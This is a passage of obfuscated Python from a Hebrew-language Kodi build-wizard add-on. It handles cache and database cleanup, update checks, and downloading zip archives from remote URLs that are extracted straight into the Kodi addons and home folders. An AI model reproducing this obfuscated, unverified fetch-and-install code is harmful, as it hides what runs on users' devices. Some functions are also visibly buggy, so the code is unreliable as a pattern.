			                                  shutil .rmtree (os .path .join (OOO00O000O0O00OO0 ,OOOOO0O00O0000OO0 ),ignore_errors =True ,onerror =None )#line:5444
			if DP .iscanceled ():#line:5445
				DP .close ()#line:5446
				wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]התקנה נקיה מבוטלת[/COLOR]"%COLOR2 )#line:5447
				return False #line:5448
		DP .close ()#line:5449
		wiz .clearS ('build')#line:5450
		if over ==True :#line:5451
			return True #line:5452
		elif install =='restore':#line:5453
			return True #line:5454
		elif install :#line:5455
			buildWizard (install ,'normal',over =True )#line:5456
		else :#line:5457
			if INSTALLMETHOD ==1 :OO0O0OO0OOOOO0000 =1 #line:5458
			elif INSTALLMETHOD ==2 :OO0O0OO0OOOOO0000 =0 #line:5459
			else :OO0O0OO0OOOOO0000 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]סיום התקנה [COLOR %s]סגירה[/COLOR] או [COLOR %s]הצגת נתונים[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),yeslabel ="[B][COLOR red]הצגת נתונים[/COLOR][/B]",nolabel ="[B][COLOR green]סגירה[/COLOR][/B]")#line:5460
			if OO0O0OO0OOOOO0000 ==1 :wiz .reloadFix ('fresh')#line:5461
			else :wiz .addonUpdates ('reset');wiz .killxbmc (True )#line:5462
	else :#line:5463
		if not install =='restore':#line:5464
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנה נקיה: מבוטלת![/COLOR]'%COLOR2 )#line:5465
			wiz .refresh ()#line:5466
def clearCache ():#line:5471
		wiz .clearCache ()#line:5472
def fixwizard ():#line:5476
		wiz .fixwizard ()#line:5477
def totalClean ():#line:5479
		wiz .clearCache ()#line:5481
		wiz .clearPackages ('total')#line:5482
		clearThumb ('total')#line:5483
		cleanfornewbuild ()#line:5484
def cleanfornewbuild ():#line:5485
		try :#line:5486
			os .remove (os .path .join (xbmc .translatePath ("special://userdata/"),"addon_data","plugin.video.idanplus","epg.xml"))#line:5487
		except :#line:5488
			pass #line:5489
		try :#line:5490
			os .remove (os .path .join (xbmc .translatePath ("special://userdata/"),"addon_data","plugin.video.idanplus","epg.json"))#line:5491
		except :#line:5492
			pass #line:5493
		try :#line:5494
			os .remove (os .path .join (xbmc .translatePath ("special://userdata/"),"addon_data","plugin.video.TheFirstAvenger","localfile.txt"))#line:5495
		except :#line:5496
			pass #line:5497
def clearThumb (type =None ):#line:5498
	OO00000000O0O00OO =wiz .latestDB ('Textures')#line:5499
	if not type ==None :OOOO0OOOO0000O000 =1 #line:5500
	else :OOOO0OOOO0000O000 =DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to delete the %s and Thumbnails folder?'%(COLOR2 ,OO00000000O0O00OO ),"They will repopulate on the next startup[/COLOR]",nolabel ='[B][COLOR red]Don\'t Delete[/COLOR][/B]',yeslabel ='[B][COLOR green]Delete Thumbs[/COLOR][/B]')#line:5501
	if OOOO0OOOO0000O000 ==1 :#line:5502
		try :wiz .removeFile (os .join (DATABASE ,OO00000000O0O00OO ))#line:5503
		except :wiz .log ('Failed to delete, Purging DB.');wiz .purgeDb (OO00000000O0O00OO )#line:5504
		wiz .removeFolder (THUMBS )#line:5505
	else :wiz .log ('Clear thumbnames cancelled')#line:5507
	wiz .redoThumbs ()#line:5508
def purgeDb ():#line:5510
	OOOO0O00O00O00OOO =[];OOOOOOO0OOOOOO0O0 =[]#line:5511
	for O000000O000O00000 ,OO00O0OO0O00O0O0O ,O0000OO000O00000O in os .walk (HOME ):#line:5512
		for O000O0O00O000OO0O in fnmatch .filter (O0000OO000O00000O ,'*.db'):#line:5513
			if O000O0O00O000OO0O !='Thumbs.db':#line:5514
				O00O000OO000OOO0O =os .path .join (O000000O000O00000 ,O000O0O00O000OO0O )#line:5515
				OOOO0O00O00O00OOO .append (O00O000OO000OOO0O )#line:5516
				OO00OOO0O0OO0OOO0 =O00O000OO000OOO0O .replace ('\\','/').split ('/')#line:5517
				OOOOOOO0OOOOOO0O0 .append ('(%s) %s'%(OO00OOO0O0OO0OOO0 [len (OO00OOO0O0OO0OOO0 )-2 ],OO00OOO0O0OO0OOO0 [len (OO00OOO0O0OO0OOO0 )-1 ]))#line:5518
	if KODIV >=16 :#line:5519
		OO0O00O00O0O0OOOO =DIALOG .multiselect ("[COLOR %s]Select DB File to Purge[/COLOR]"%COLOR2 ,OOOOOOO0OOOOOO0O0 )#line:5520
		if OO0O00O00O0O0OOOO ==None :wiz .LogNotify ("[COLOR %s]Purge Database[/COLOR]"%COLOR1 ,"[COLOR %s]Cancelled[/COLOR]"%COLOR2 )#line:5521
		elif len (OO0O00O00O0O0OOOO )==0 :wiz .LogNotify ("[COLOR %s]Purge Database[/COLOR]"%COLOR1 ,"[COLOR %s]Cancelled[/COLOR]"%COLOR2 )#line:5522
		else :#line:5523
			for OOOOOO0OOOOOOOO00 in OO0O00O00O0O0OOOO :wiz .purgeDb (OOOO0O00O00O00OOO [OOOOOO0OOOOOOOO00 ])#line:5524
	else :#line:5525
		OO0O00O00O0O0OOOO =DIALOG .select ("[COLOR %s]Select DB File to Purge[/COLOR]"%COLOR2 ,OOOOOOO0OOOOOO0O0 )#line:5526
		if OO0O00O00O0O0OOOO ==-1 :wiz .LogNotify ("[COLOR %s]Purge Database[/COLOR]"%COLOR1 ,"[COLOR %s]Cancelled[/COLOR]"%COLOR2 )#line:5527
		else :wiz .purgeDb (OOOO0O00O00O00OOO [OOOOOO0OOOOOOOO00 ])#line:5528
def fastupdatefirstbuild (O0OOO000O00OOOOO0 ):#line:5534
	wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]בודק אם קיים עדכון בשבילך[/COLOR]'%COLOR2 )#line:5536
	if ENABLE =='Yes':#line:5537
		if not NOTIFY =='true':#line:5538
			O0O000OOOOO0O00O0 =wiz .workingURL (NOTIFICATION )#line:5539
			if O0O000OOOOO0O00O0 ==True :#line:5540
				O0OO00OOOOOOOO00O ,O0O0OO0OOOO000OOO =wiz .splitNotify (NOTIFICATION )#line:5541
				if not O0OO00OOOOOOOO00O ==False :#line:5543
					try :#line:5544
						O0OO00OOOOOOOO00O =int (O0OO00OOOOOOOO00O );O0OOO000O00OOOOO0 =int (O0OOO000O00OOOOO0 )#line:5545
						checkidupdate ()#line:5546
						wiz .setS ("notedismiss","true")#line:5547
						if O0OO00OOOOOOOO00O ==O0OOO000O00OOOOO0 :#line:5548
							wiz .log ("[Notifications] id[%s] Dismissed"%int (O0OO00OOOOOOOO00O ),xbmc .LOGNOTICE )#line:5549
						elif O0OO00OOOOOOOO00O >O0OOO000O00OOOOO0 :#line:5551
							wiz .log ("[Notifications] id: %s"%str (O0OO00OOOOOOOO00O ),xbmc .LOGNOTICE )#line:5552
							wiz .setS ('noteid',str (O0OO00OOOOOOOO00O ))#line:5553
							wiz .setS ("notedismiss","true")#line:5554
							wiz .log ("[Notifications] Complete",xbmc .LOGNOTICE )#line:5557
					except Exception as OO00O00OOOO0O0000 :#line:5558
						wiz .log ("Error on Notifications Window: %s"%str (OO00O00OOOO0O0000 ),xbmc .LOGERROR )#line:5559
				else :wiz .log ("[Notifications] Text File not formated Correctly")#line:5561
			else :wiz .log ("[Notifications] URL(%s): %s"%(NOTIFICATION ,O0O000OOOOO0O00O0 ),xbmc .LOGNOTICE )#line:5562
		else :wiz .log ("[Notifications] Turned Off",xbmc .LOGNOTICE )#line:5563
	else :wiz .log ("[Notifications] Not Enabled",xbmc .LOGNOTICE )#line:5564
def checkUpdate ():#line:5566
	OOO0O00OO0OO0O0OO =wiz .getS ('disableupdate')#line:5567
	OO000O00O0O0000OO =wiz .getS ('buildname')#line:5568
	OO00O0O00OO0O000O =wiz .getS ('buildversion')#line:5569
	O0O00O0000O00OOOO =wiz .openURL (SPEEDFILE ).replace ('\n','').replace ('\r','').replace ('\t','')#line:5570
	O00OO000OO0O00OO0 =re .compile ('name="%s".+?ersion="(.+?)".+?con="(.+?)".+?anart="(.+?)"'%OO000O00O0O0000OO ).findall (O0O00O0000O00OOOO )#line:5571
	if len (O00OO000OO0O00OO0 )>0 :#line:5572
		OO0O0OOOOOO0OO0OO =O00OO000OO0O00OO0 [0 ][0 ]#line:5573
		OOO0OO0O0000O000O =O00OO000OO0O00OO0 [0 ][1 ]#line:5574
		OO000O00OO00O000O =O00OO000OO0O00OO0 [0 ][2 ]#line:5575
		wiz .setS ('latestversion',OO0O0OOOOOO0OO0OO )#line:5576
		if OO0O0OOOOOO0OO0OO >OO00O0O00OO0O000O :#line:5577
			if OOO0O00OO0OO0O0OO =='false':#line:5578
				wiz .log ("[Check Updates] [Installed Version: %s] [Current Version: %s] Opening Update Window"%(OO00O0O00OO0O000O ,OO0O0OOOOOO0OO0OO ),xbmc .LOGNOTICE )#line:5579
				notify .updateWindow (OO000O00O0O0000OO ,OO00O0O00OO0O000O ,OO0O0OOOOOO0OO0OO ,OOO0OO0O0000O000O ,OO000O00OO00O000O )#line:5580
			else :wiz .log ("[Check Updates] [Installed Version: %s] [Current Version: %s] Update Window Disabled"%(OO00O0O00OO0O000O ,OO0O0OOOOOO0OO0OO ),xbmc .LOGNOTICE )#line:5581
		else :wiz .log ("[Check Updates] [Installed Version: %s] [Current Version: %s]"%(OO00O0O00OO0O000O ,OO0O0OOOOOO0OO0OO ),xbmc .LOGNOTICE )#line:5582
	else :wiz .log ("[Check Updates] ERROR: Unable to find build version in build text file",xbmc .LOGERROR )#line:5583
def updatetelemedia (O0O0000OO0000O0OO ):#line:5584
    from startup import teleupdate #line:5585
    wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]בודק אם קיים עדכון בשבילך[/COLOR]'%COLOR2 )#line:5586
    xbmc .executebuiltin ("UpdateLocalAddons")#line:5587
    xbmc .executebuiltin ("UpdateAddonRepos")#line:5588
    wiz .wizardUpdate ('startup')#line:5589
    checkUpdate ()#line:5591
    xbmc .executebuiltin ((u'Notification(%s,%s)'%('Kodi Anonymous','בודק אם קיים עדכון בשבילך')))#line:5592
    time .sleep (15.0 )#line:5593
    if ENABLE =='Yes'and BUILDNAME ==" Kodi Premium":#line:5594
     if teleupdate is False :#line:5595
        STARTP2 ()#line:5597
        wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]בודק אם קיים עדכון בשבילך[/COLOR]'%COLOR2 )#line:5598
        if not NOTIFY =='true':#line:5599
            O00OO0O00O0OOOO0O =wiz .workingURL (NOTIFICATION )#line:5600
            if O00OO0O00O0OOOO0O ==True :#line:5601
                O0OO0000OO0OO000O ,O00O00000000O00O0 =wiz .splitNotify (NOTIFICATION )#line:5602
                if not O0OO0000OO0OO000O ==False :#line:5603
                    try :#line:5604
                        O0OO0000OO0OO000O =int (O0OO0000OO0OO000O );O0O0000OO0000O0OO =int (O0O0000OO0000O0OO )#line:5605
                        if O0OO0000OO0OO000O ==O0O0000OO0000O0OO :#line:5606
                            if NOTEDISMISS =='false':#line:5607
                                debridit .debridIt ('update','all')#line:5608
                                traktit .traktIt ('update','all')#line:5609
                                checkidupdatetele ()#line:5610
                            else :wiz .log ("[Notifications] id[%s] Dismissed"%int (O0OO0000OO0OO000O ),xbmc .LOGNOTICE )#line:5611
                        elif O0OO0000OO0OO000O >O0O0000OO0000O0OO :#line:5612
                            wiz .log ("[Notifications] id: %s"%str (O0OO0000OO0OO000O ),xbmc .LOGNOTICE )#line:5613
                            wiz .setS ('noteid',str (O0OO0000OO0OO000O ))#line:5614
                            wiz .setS ('notedismiss','false')#line:5615
                            debridit .debridIt ('update','all')#line:5617
                            traktit .traktIt ('update','all')#line:5618
                            checkidupdatetele ()#line:5619
                            wiz .log ("[Notifications] Complete",xbmc .LOGNOTICE )#line:5621
                    except Exception as OO0OO0OO0O0OO0000 :#line:5622
                        wiz .log ("Error on Notifications Window: %s"%str (OO0OO0OO0O0OO0000 ),xbmc .LOGERROR )#line:5623
                else :wiz .log ("[Notifications] Text File not formated Correctly")#line:5624
            else :wiz .log ("[Notifications] URL(%s): %s"%(NOTIFICATION ,O00OO0O00O0OOOO0O ),xbmc .LOGNOTICE )#line:5625
        else :wiz .log ("[Notifications] Turned Off",xbmc .LOGNOTICE )#line:5626
def checkidupdate ():#line:5630
				wiz .setS ("notedismiss","true")#line:5632
				O0OO00OO00O0O00OO =wiz .workingURL (NOTIFICATION )#line:5633
				O0OOO0OOOOO00O0OO =" Kodi Premium"#line:5635
				O00OOO0O0O0OOOO0O =wiz .checkBuild (O0OOO0OOOOO00O0OO ,'gui')#line:5636
				OO000000OOO000OO0 =O0OOO0OOOOO00O0OO .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:5637
				if not wiz .workingURL (O00OOO0O0O0OOOO0O )==True :return #line:5638
				if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:5639
				DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד עדכון מהיר אוטומטי:[/B][/COLOR][COLOR %s][/COLOR]'%(COLOR1 ,O0OOO0OOOOO00O0OO ),'','אנא המתן')#line:5640
				O000OOO0O0OOOOO0O =os .path .join (PACKAGES ,'%s_guisettings.zip'%OO000000OOO000OO0 )#line:5641
				try :os .remove (O000OOO0O0OOOOO0O )#line:5642
				except :pass #line:5643
				logging .warning (O00OOO0O0O0OOOO0O )#line:5644
				if 'google'in O00OOO0O0O0OOOO0O :#line:5645
				   O0OO000OOO0O00OO0 =googledrive_download (O00OOO0O0O0OOOO0O ,O000OOO0O0OOOOO0O ,DP ,wiz .checkBuild (O0OOO0OOOOO00O0OO ,'filesize'))#line:5646
				else :#line:5649
				  downloader .download (O00OOO0O0O0OOOO0O ,O000OOO0O0OOOOO0O ,DP )#line:5650
				xbmc .sleep (100 )#line:5651
				O00O000OOO0OO00O0 ='[COLOR %s][B]מתקין:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0OOO0OOOOO00O0OO )#line:5652
				DP .update (0 ,O00O000OOO0OO00O0 ,'','אנא המתן')#line:5653
				extract .all (O000OOO0O0OOOOO0O ,HOME ,DP ,title =O00O000OOO0OO00O0 )#line:5654
				DP .close ()#line:5655
				wiz .defaultSkin ()#line:5656
				wiz .lookandFeelData ('save')#line:5657
				if KODIV >=18 :#line:5658
					skindialogsettind18 ()#line:5659
				if INSTALLMETHOD ==1 :OOO00OO0O0OOO0OO0 =1 #line:5662
				elif INSTALLMETHOD ==2 :OOO00OO0O0OOO0OO0 =0 #line:5663
				else :DP .close ()#line:5664
def checkidupdatetele ():#line:5665
				wiz .setS ("notedismiss","true")#line:5667
				O0O00O0OOOOO0000O =wiz .workingURL (NOTIFICATION )#line:5668
				O0O0000OO00OOO0O0 =" Kodi Premium"#line:5670
				OO000000000O00OO0 =wiz .checkBuild (O0O0000OO00OOO0O0 ,'gui')#line:5671
				OOOO00OOOOOOOOOOO =O0O0000OO00OOO0O0 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:5672
				if not wiz .workingURL (OO000000000O00OO0 )==True :return #line:5673
				if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:5674
				O00O000000O0O0OO0 =os .path .join (PACKAGES ,'%s_guisettings.zip'%OOOO00OOOOOOOOOOO )#line:5677
				try :os .remove (O00O000000O0O0OO0 )#line:5678
				except :pass #line:5679
				if 'google'in OO000000000O00OO0 :#line:5681
				   OOOO0O0OOO00000O0 =googledrive_download (OO000000000O00OO0 ,O00O000000O0O0OO0 ,DP2 ,wiz .checkBuild (O0O0000OO00OOO0O0 ,'filesize'))#line:5682
				else :#line:5685
				  downloaderbg .download3 (OO000000000O00OO0 ,O00O000000O0O0OO0 ,DP2 )#line:5686
				xbmc .sleep (100 )#line:5687
				DP2 .create ('[B][COLOR=green]מתקין                         [/COLOR][/B]')#line:5688
				DP2 .update (100 ,message ='[B][COLOR=yellow]אנא המתן ...                    [/COLOR][/B]')#line:5690
				extract .all2 (O00O000000O0O0OO0 ,HOME ,DP2 )#line:5692
				DP2 .close ()#line:5693
				wiz .defaultSkin ()#line:5694
				wiz .lookandFeelData ('save')#line:5695
				wiz .kodi17Fix ()#line:5696
				if KODIV >=18 :#line:5697
					skindialogsettind18 ()#line:5698
				debridit .debridIt ('restore','all')#line:5703
				traktit .traktIt ('restore','all')#line:5704
				if INSTALLMETHOD ==1 :OOOO0OO00000O0OOO =1 #line:5705
				elif INSTALLMETHOD ==2 :OOOO0OO00000O0OOO =0 #line:5706
				else :DP2 .close ()#line:5707
				O000000O00OOO00OO =(NOTIFICATION2 )#line:5708
				OO0OO0O00OOO00OO0 =urllib2 .urlopen (O000000O00OOO00OO )#line:5709
				O0O00O0OOOOO00000 =OO0OO0O00OOO00OO0 .readlines ()#line:5710
				OO00O0000O00OO000 =0 #line:5711
				for O0OO0O00000O0OO00 in O0O00O0OOOOO00000 :#line:5714
					if O0OO0O00000O0OO00 .split (' ==')[0 ]=="noreset"or O0OO0O00000O0OO00 .split ()[0 ]=="noreset":#line:5715
						xbmc .executebuiltin ("ReloadSkin()")#line:5717
						wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]הבילד עודכן בהצלחה![/COLOR]'%COLOR2 )#line:5718
						O0OOOOOO0O00O0OO0 =(ADDON .getSetting ("message"))#line:5719
						if O0OOOOOO0O00O0OO0 =='true':#line:5720
							infobuild ()#line:5721
						update_Votes ()#line:5722
						indicatorfastupdate ()#line:5723
					if O0OO0O00000O0OO00 .split (' ==')[0 ]=="reset"or O0OO0O00000O0OO00 .split ()[0 ]=="reset":#line:5724
						update_Votes ()#line:5726
						indicatorfastupdate ()#line:5727
						resetkodi ()#line:5728
def gaiaserenaddon ():#line:5729
  OO0O0OO0O0O0000OO =(ADDON .getSetting ("gaiaseren"))#line:5730
  OO0000OO00O0OOO0O =(ADDON .getSetting ("auto_rd"))#line:5731
  if OO0O0OO0O0O0000OO =='true'and OO0000OO00O0OOO0O =='true':#line:5732
    O0OOOOO0OO0000OOO =(NEWFASTUPDATE )#line:5733
    OOOOO0O000O0OOOO0 =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:5734
    O0OOOO0OOO0OO0O00 =xbmcgui .DialogProgress ()#line:5735
    O0OOOO0OOO0OO0O00 .create ("[B][COLOR=green]מתקין את ההרחבה גאיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]" '','אנא המתן')#line:5736
    OO00OOO0O00000O0O =os .path .join (PACKAGES ,'isr.zip')#line:5737
    OOOOOO0O0O000OO00 =urllib2 .Request (O0OOOOO0OO0000OOO )#line:5738
    O0000000OO0O000O0 =urllib2 .urlopen (OOOOOO0O0O000OO00 )#line:5739
    O00000O00O0O0O0O0 =xbmcgui .DialogProgress ()#line:5741
    O00000O00O0O0O0O0 .create ("[B][COLOR=green]מתקין את ההרחבה גאיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]")#line:5742
    O00000O00O0O0O0O0 .update (0 )#line:5743
    O0OO0OOOOOO00O0O0 =open (OO00OOO0O00000O0O ,'wb')#line:5745
    try :#line:5747
      OO0OOO0000O00OOO0 =O0000000OO0O000O0 .info ().getheader ('Content-Length').strip ()#line:5748
      OO0OOOO0O0OOO00OO =True #line:5749
    except AttributeError :#line:5750
          OO0OOOO0O0OOO00OO =False #line:5751
    if OO0OOOO0O0OOO00OO :#line:5753
          OO0OOO0000O00OOO0 =int (OO0OOO0000O00OOO0 )#line:5754
    OOO00O0O000OOOOO0 =0 #line:5756
    O000O0O00O0OOO000 =time .time ()#line:5757
    while True :#line:5758
          OOO0OO0OOO00OOO0O =O0000000OO0O000O0 .read (8192 )#line:5759
          if not OOO0OO0OOO00OOO0O :#line:5760
              sys .stdout .write ('\n')#line:5761
              break #line:5762
          OOO00O0O000OOOOO0 +=len (OOO0OO0OOO00OOO0O )#line:5764
          O0OO0OOOOOO00O0O0 .write (OOO0OO0OOO00OOO0O )#line:5765
          if not OO0OOOO0O0OOO00OO :#line:5767
              OO0OOO0000O00OOO0 =OOO00O0O000OOOOO0 #line:5768
          if O00000O00O0O0O0O0 .iscanceled ():#line:5769
             O00000O00O0O0O0O0 .close ()#line:5770
             try :#line:5771
              os .remove (OO00OOO0O00000O0O )#line:5772
             except :#line:5773
              pass #line:5774
             break #line:5775
          O0OO0O00O00OO0OO0 =float (OOO00O0O000OOOOO0 )/OO0OOO0000O00OOO0 #line:5776
          O0OO0O00O00OO0OO0 =round (O0OO0O00O00OO0OO0 *100 ,2 )#line:5777
          O000O0OOOOO0000OO =OOO00O0O000OOOOO0 /(1024 *1024 )#line:5778
          O0O000OOOOO0O0OOO =OO0OOO0000O00OOO0 /(1024 *1024 )#line:5779
          O00000000000O0OOO ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',O000O0OOOOO0000OO ,'teal',O0O000OOOOO0O0OOO )#line:5780
          if (time .time ()-O000O0O00O0OOO000 )>0 :#line:5781
            OOOOO000O00000000 =OOO00O0O000OOOOO0 /(time .time ()-O000O0O00O0OOO000 )#line:5782
            OOOOO000O00000000 =OOOOO000O00000000 /1024 #line:5783
          else :#line:5784
           OOOOO000O00000000 =0 #line:5785
          OOO0000O0OO0O0OO0 ='KB'#line:5786
          if OOOOO000O00000000 >=1024 :#line:5787
             OOOOO000O00000000 =OOOOO000O00000000 /1024 #line:5788
             OOO0000O0OO0O0OO0 ='MB'#line:5789
          if OOOOO000O00000000 >0 and not O0OO0O00O00OO0OO0 ==100 :#line:5790
              OOO0O0O00000000O0 =(OO0OOO0000O00OOO0 -OOO00O0O000OOOOO0 )/OOOOO000O00000000 #line:5791
          else :#line:5792
              OOO0O0O00000000O0 =0 #line:5793
          OO00OO000OOO0OOOO ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',OOOOO000O00000000 ,OOO0000O0OO0O0OO0 )#line:5794
          O00000O00O0O0O0O0 .update (int (O0OO0O00O00OO0OO0 ),O00000000000O0OOO ,OO00OO000OOO0OOOO +"[B][COLOR=yellow]מוריד.... [/COLOR][/B]")#line:5796
    O0O00O00OOOO000O0 =xbmc .translatePath (os .path .join ('special://home/addons'))#line:5799
    O0OO0OOOOOO00O0O0 .close ()#line:5802
    extract .all (OO00OOO0O00000O0O ,O0O00O00OOOO000O0 ,O00000O00O0O0O0O0 )#line:5803
    try :#line:5807
      os .remove (OO00OOO0O00000O0O )#line:5808
    except :#line:5809
      pass #line:5810
def iptvsimpldownpc ():#line:5811
    OO0O0O0000000OO00 =(IPTVSIMPL18PC )#line:5813
    O0O00OOOOOOO000OO =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:5814
    O0000OOOOO00O000O =xbmcgui .DialogProgress ()#line:5815
    O0000OOOOO00O000O .create ("[B][COLOR=green]מוריד לוקח טלוויזיה חיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]" '','אנא המתן')#line:5816
    OO0O00O0OOO0OO0O0 =os .path .join (PACKAGES ,'isr.zip')#line:5817
    OO0O0O0O0O0O0OO00 =urllib2 .Request (OO0O0O0000000OO00 )#line:5818
    O0O00O0OOO00OOOO0 =urllib2 .urlopen (OO0O0O0O0O0O0OO00 )#line:5819
    OOO0O00O000OO000O =xbmcgui .DialogProgress ()#line:5821
    OOO0O00O000OO000O .create ("[B][COLOR=green]מוריד לוקח טלוויזיה חיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]")#line:5822
    OOO0O00O000OO000O .update (0 )#line:5823
    O0OO00OO0O0OO0OOO =open (OO0O00O0OOO0OO0O0 ,'wb')#line:5825
    try :#line:5827
      OO0OO0OO000000000 =O0O00O0OOO00OOOO0 .info ().getheader ('Content-Length').strip ()#line:5828
      O0O0OOO00000OO0O0 =True #line:5829
    except AttributeError :#line:5830
          O0O0OOO00000OO0O0 =False #line:5831
    if O0O0OOO00000OO0O0 :#line:5833
          OO0OO0OO000000000 =int (OO0OO0OO000000000 )#line:5834
    O0O00O00O0O0OOOO0 =0 #line:5836
    OOO0O00O00000O0OO =time .time ()#line:5837
    while True :#line:5838
          O0O0O0O00O0OOOOO0 =O0O00O0OOO00OOOO0 .read (8192 )#line:5839
          if not O0O0O0O00O0OOOOO0 :#line:5840
              sys .stdout .write ('\n')#line:5841
              break #line:5842
          O0O00O00O0O0OOOO0 +=len (O0O0O0O00O0OOOOO0 )#line:5844
          O0OO00OO0O0OO0OOO .write (O0O0O0O00O0OOOOO0 )#line:5845
          if not O0O0OOO00000OO0O0 :#line:5847
              OO0OO0OO000000000 =O0O00O00O0O0OOOO0 #line:5848
          if OOO0O00O000OO000O .iscanceled ():#line:5849
             OOO0O00O000OO000O .close ()#line:5850
             try :#line:5851
              os .remove (OO0O00O0OOO0OO0O0 )#line:5852
             except :#line:5853
              pass #line:5854
             break #line:5855
          O0OOO00000OO0O0O0 =float (O0O00O00O0O0OOOO0 )/OO0OO0OO000000000 #line:5856
          O0OOO00000OO0O0O0 =round (O0OOO00000OO0O0O0 *100 ,2 )#line:5857
          O0O0O0OOO0O0OO0OO =O0O00O00O0O0OOOO0 /(1024 *1024 )#line:5858
          O000O0O0OOOOO0OO0 =OO0OO0OO000000000 /(1024 *1024 )#line:5859
          OOO00OO00O000OO0O ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',O0O0O0OOO0O0OO0OO ,'teal',O000O0O0OOOOO0OO0 )#line:5860
          if (time .time ()-OOO0O00O00000O0OO )>0 :#line:5861
            O0O0OO0OOOO0O0000 =O0O00O00O0O0OOOO0 /(time .time ()-OOO0O00O00000O0OO )#line:5862
            O0O0OO0OOOO0O0000 =O0O0OO0OOOO0O0000 /1024 #line:5863
          else :#line:5864
           O0O0OO0OOOO0O0000 =0 #line:5865
          O0O000O0OO00000OO ='KB'#line:5866
          if O0O0OO0OOOO0O0000 >=1024 :#line:5867
             O0O0OO0OOOO0O0000 =O0O0OO0OOOO0O0000 /1024 #line:5868
             O0O000O0OO00000OO ='MB'#line:5869
          if O0O0OO0OOOO0O0000 >0 and not O0OOO00000OO0O0O0 ==100 :#line:5870
              OOO0O0000O0O0O000 =(OO0OO0OO000000000 -O0O00O00O0O0OOOO0 )/O0O0OO0OOOO0O0000 #line:5871
          else :#line:5872
              OOO0O0000O0O0O000 =0 #line:5873
          OOOOOOO00OO0OO0O0 ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',O0O0OO0OOOO0O0000 ,O0O000O0OO00000OO )#line:5874
          OOO0O00O000OO000O .update (int (O0OOO00000OO0O0O0 ),OOO00OO00O000OO0O ,OOOOOOO00OO0OO0O0 +"[B][COLOR=yellow]מוריד.... [/COLOR][/B]")#line:5876
    O0OOO000O00OO00O0 =xbmc .translatePath (os .path .join ('special://home/addons'))#line:5879
    O0OO00OO0O0OO0OOO .close ()#line:5882
    extract .all (OO0O00O0OOO0OO0O0 ,O0OOO000O00OO00O0 ,OOO0O00O000OO000O )#line:5883
    try :#line:5887
      os .remove (OO0O00O0OOO0OO0O0 )#line:5888
    except :#line:5889
      pass #line:5890
def iptvkodi18idan ():#line:5891
      if xbmc .getCondVisibility ('system.platform.windows')and KODIV >=18 :#line:5893
              O0OO00OOO000O00O0 ='https://github.com/vip200/victory/blob/master/pvr.iptvsimple18win.zip?raw=true'#line:5896
              OO0O0OO0OOO0000OO =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:5897
              OO00000OO0000O00O =xbmcgui .DialogProgress ()#line:5898
              OO00000OO0000O00O .create ("XBMC ISRAEL","Downloading "+'הגדרת ערוצי עידן פלוס','','Please Wait')#line:5899
              O00OOO0000OO000O0 =os .path .join (OO0O0OO0OOO0000OO ,'isr.zip')#line:5900
              OO0O00O0OO0O0O000 =urllib2 .Request (O0OO00OOO000O00O0 )#line:5901
              OOOOO00OO0O0O0000 =urllib2 .urlopen (OO0O00O0OO0O0O000 )#line:5902
              O0OOO0OO0O0O0OOO0 =xbmcgui .DialogProgress ()#line:5904
              O0OOO0OO0O0O0OOO0 .create ("Downloading","Downloading "+'הגדרת ערוצי עידן פלוס')#line:5905
              O0OOO0OO0O0O0OOO0 .update (0 )#line:5906
              O00OO0O00OOOOOO0O =open (O00OOO0000OO000O0 ,'wb')#line:5908
              try :#line:5910
                O000O0O0OOOO0O0OO =OOOOO00OO0O0O0000 .info ().getheader ('Content-Length').strip ()#line:5911
                OOOOOOO00000O0OO0 =True #line:5912
              except AttributeError :#line:5913
                    OOOOOOO00000O0OO0 =False #line:5914
              if OOOOOOO00000O0OO0 :#line:5916
                    O000O0O0OOOO0O0OO =int (O000O0O0OOOO0O0OO )#line:5917
              OO00O00OOOO0OO000 =0 #line:5919
              OO0000O0OOO00OO0O =time .time ()#line:5920
              while True :#line:5921
                    OO0O000O000OO00O0 =OOOOO00OO0O0O0000 .read (8192 )#line:5922
                    if not OO0O000O000OO00O0 :#line:5923
                        sys .stdout .write ('\n')#line:5924
                        break #line:5925
                    OO00O00OOOO0OO000 +=len (OO0O000O000OO00O0 )#line:5927
                    O00OO0O00OOOOOO0O .write (OO0O000O000OO00O0 )#line:5928
